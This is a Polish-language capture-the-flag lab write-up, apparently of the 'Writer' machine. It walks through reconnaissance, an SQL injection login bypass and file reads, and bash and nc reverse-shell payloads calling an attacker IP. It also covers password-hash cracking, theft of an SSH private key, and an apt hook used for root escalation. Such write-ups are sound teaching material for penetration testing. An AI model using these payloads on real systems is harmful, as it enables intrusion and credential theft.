# ZTPPt

## Utworzenie połączenia z maszyną
Pobrany został plik konfiguracyjny OpenVPN na maszynę wirtualną z zainstalowanym systemem Kali Linux. Komenda do wywołania połaczenia VPN:
```
sudo openvpn lab.vpn
```

## Przebieg laboratorium
* Pierwszym krokiem było wykorzystanie oprogramowania nmap w celu rekonensanu aktywnego, użyto w tym celu komendy:
```
sudo nmap -sS -sV -sC <ip_address>
- sS - TCP SYN skan
- sV - sprawdzenie możliwosci występowania wersji oprogramowania na otwartym porcie
- sC - wykonanie podstawowych skryptów
```
Wynik skanowania

![Wynik skanowania](https://user-images.githubusercontent.com/52716721/141511219-992c3762-5266-45f4-82fd-62ae04e1c934.png)

* Biorąc pod uwagę otwarty port 80 oraz tytuł odpowiedzi z serwera HTTP, kolejne kroki będą prowadzone na stronie WWW, prezentującej się następująco
![Stronawww](https://user-images.githubusercontent.com/52716721/141511808-81ba4197-1cfd-4d19-9234-3433a15dec20.png)

* W celu znalezienia interesujących podstron, wykorzystane zostało wbudowane narzędzie wfuzz z atakiem słownikowym:
```
wfuzz -w /usr/share/wfuzz/wordlist/general/megabeast.txt -u http://10.10.11.101/FUZZ --hc 404
- w - ścieżka do słownika z podstronami
- u - adres strony z dodatkiem FUZZ w celu skanowania
- hc 404 - pominięcie podstron z odpowiedzią 404
```
Wynik skanowania wfuzz

![wfuzz](https://user-images.githubusercontent.com/52716721/141513351-5ff7381f-e698-43fc-89c7-81208a4f3e6c.png)

* Na stronie dostępny jest panel logowania administratora, pierwszym krokiem zostało sprawdzenie czy zadziała SQLi w tym celu użyto w polu loginu frazy `username ' or '1'='1`. Logowanie powiodło się, następnie wykorzystano sqlmap w celu sprawdzenia jaka jest skonfigurowana baza danych i użyto danych z formularza do logowania `uname=username'+or+'1'='1&password=test`.
Wynik prezentuje się następująco:

![image](https://user-images.githubusercontent.com/52716721/143478884-83138642-c297-49ad-b8b9-b0a13311ad73.png)

* Kolejnym krokiem była próba odczytania plików znajdujących się na maszynie, wykorzystano do tego program Burp Suite i payload `uname=username' UNION ALL SELECT NULL,load_file("/etc/apache2/sites-enabled/000-default.conf"),NULL,NULL,NULL,NULL-- -&password=test`. Odczyt pliku 000-default spowodowany jest występującym serwisem Apache, w podanym pliku konfiguruje się wirtualny host dla danej domeny, odczyt z folderu sites-avaliable mógłby nie zadziałać gdyż musi występować symlink w folderze enabled.
![image](https://user-images.githubusercontent.com/52716721/143478354-b7a9d660-18e8-4735-8002-3e3601dabfc1.png)

* Następnie odczytany został plik writer.wsgi (`uname=username' UNION ALL SELECT NULL,load_file("/var/www/writer.htb/writer.wsgi"),NULL,NULL,NULL,NULL-- -&password=test`), w którym importowany jest plik `__init__.py`.
![image](https://user-images.githubusercontent.com/52716721/143478809-566682a5-ca8f-4eb5-a72b-a2b08fc40f60.png)
![image](https://user-images.githubusercontent.com/52716721/143479464-bab8af2c-5c28-4e29-bc21-90d08b245957.png)
![image](https://user-images.githubusercontent.com/52716721/143479566-63bc8a3a-1baa-404d-bb12-aa454b7ced0a.png)

* Okazuje się, że aplikacja napisana została we Flask'u, dodając Stories poprzez panel admina, można podać dodatkowy parametr przy pomocy Burp'a `image_url`, który następnie jest przenoszony oraz otwierany co udostępnia możliwość stworzenia reverse shella. Stworzony został złośliwy plik w formacie jpg, zawierający w nazwie payload w base64 `echo -n '/bin/bash -c "/bin/bash -i >& /dev/tcp/<ip>/9091 0>&1"' | base64`. W parametrze image_url podana została ścieżka do pliku, który po zapisaniu znajduje się w folderze static `file:///var/www/writer.htb/writer/static/img/<plik>`. Wynik prezentuje się poniżej.
![image](https://user-images.githubusercontent.com/52716721/141533167-0eb874b8-da4b-470f-af05-8a3f6688f1bd.png)
![image](https://user-images.githubusercontent.com/52716721/141533062-d4f0b4b6-4639-486f-bd20-947c012012d5.png)

* Dzięki sqlmap otrzymano nazwę serwisu bazodanowego MariaDB, po udanym przejęciu sesji www-data, odnaleziony został plik konfiguracyjny mariadb.cnf, gdzie podane zostały dane do zalogowania w bazie deweloperskiej.
![image](https://user-images.githubusercontent.com/52716721/141533938-7c74d7bb-2572-46cb-9c1b-6d3e69b38044.png)

* Po udanym połączeniu z bazą odczytane zostały możliwe tabele, najciekawszą z nazwy jest auth_user, w niej znaleziony został użytkownik kyle wraz z zahashowanym hasłem.
![image](https://user-images.githubusercontent.com/52716721/143593639-a6682460-2692-498d-8c02-b000b1827bf3.png)
![image](https://user-images.githubusercontent.com/52716721/143593570-4da314d9-aa10-49db-b95c-724f8ad3a44f.png)

* W celu odczytania hasła wykorzystany został atak słownikowy z plikiem rockyou znajdującym się pod linkiem https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz oraz program hashcat, który ujawnił hasło marcoantonio
![image](https://user-images.githubusercontent.com/52716721/143597265-0dc3a738-8d06-4216-8612-f284a6a84b5a.png)

* Następnie sprawdzony został użytkownik czy jest możliwość połączenia przez ssh. Wynikiem był dostęp do jednego z użytkowników systemu.

![image](https://user-images.githubusercontent.com/52716721/144602561-4c26a048-5eaa-4fde-b787-32728e26c41a.png)

* Użytkownik należy do niestandardowej grupy filter, która jest odpowiedzialna za pliki prezentujące się na poniższym zrzucie.
![image](https://user-images.githubusercontent.com/52716721/143599339-fb5de575-7cf1-4538-8bd8-96eab3fa917c.png)

* Jako iż plik disclaimer jest wykorzystywany do podpisywania maili, dodano w nim reverse shell taki jak w przypadku pliku na stronie internetowej oraz przesłano maila z wykorzystaniem skryptu w pythonie. W folderze disclaimer znaleziony został adres, który można wykorzystać właśnie do przesłania maila.
![image](https://user-images.githubusercontent.com/52716721/144605156-a1f146cf-b493-4508-95da-f531e2ffb9d5.png)
![image](https://user-images.githubusercontent.com/52716721/144605209-7044ad3a-a873-4c82-839c-72419f0c3088.png)

![image](https://user-images.githubusercontent.com/52716721/144605193-ac75e000-499d-4180-932f-8f7f1cda4ca0.png)
* W czasie wysyłania maila, nasłuchiwany był port 9091 podany w reverse shell w pliku disclaimer, dzięki czemu uzyskany został użytkownik john. 

![image](https://user-images.githubusercontent.com/52716721/144605478-496530d0-d519-4d03-b875-6a1f7427ec16.png)

* Aby połączyć się do niego poprzez ssh, skopiowany został klucz prywatny z folderu `.ssh` użytkownika.
![image](https://user-images.githubusercontent.com/52716721/144605507-4d6e177b-6f35-4a40-b73a-b2c3f1724f88.png)

* Połączenie ssh prezentuje się następująco.
![image](https://user-images.githubusercontent.com/52716721/144605856-11d72409-960a-4db4-b594-a08a2f4a88dd.png)

* Użytkownik john również miał niestandardową grupę management i posiadał prawa do folderu apt.conf.d
![image](https://user-images.githubusercontent.com/52716721/144606016-8f5f427c-607b-4b3c-b29d-79cced652c14.png)
![image](https://user-images.githubusercontent.com/52716721/144606001-356798db-63d1-410d-80f7-bea6f41b5354.png)

* Znaleziona została możliwość eskalacji uprawnień z wykorzystaniem apt https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/ w tym celu należy przejść do podanego folderu i wykonać payload tworzący reverse shell `echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 4444 >/tmp/f"};' > pwn`. W innym oknie nasłuchiwany został port 4444, dzięki czemu uzyskano dostęp do roota. Wynik prezentuje się następująco:
![image](https://user-images.githubusercontent.com/52716721/144607092-e7cf791d-4725-4600-8777-a2528130858d.png)

* Ostatnim krokiem było odczytanie flagi z pliku root.txt

![image](https://user-images.githubusercontent.com/52716721/144607190-4eaa5b07-7777-4eda-8404-74a5b0b4d29b.png)
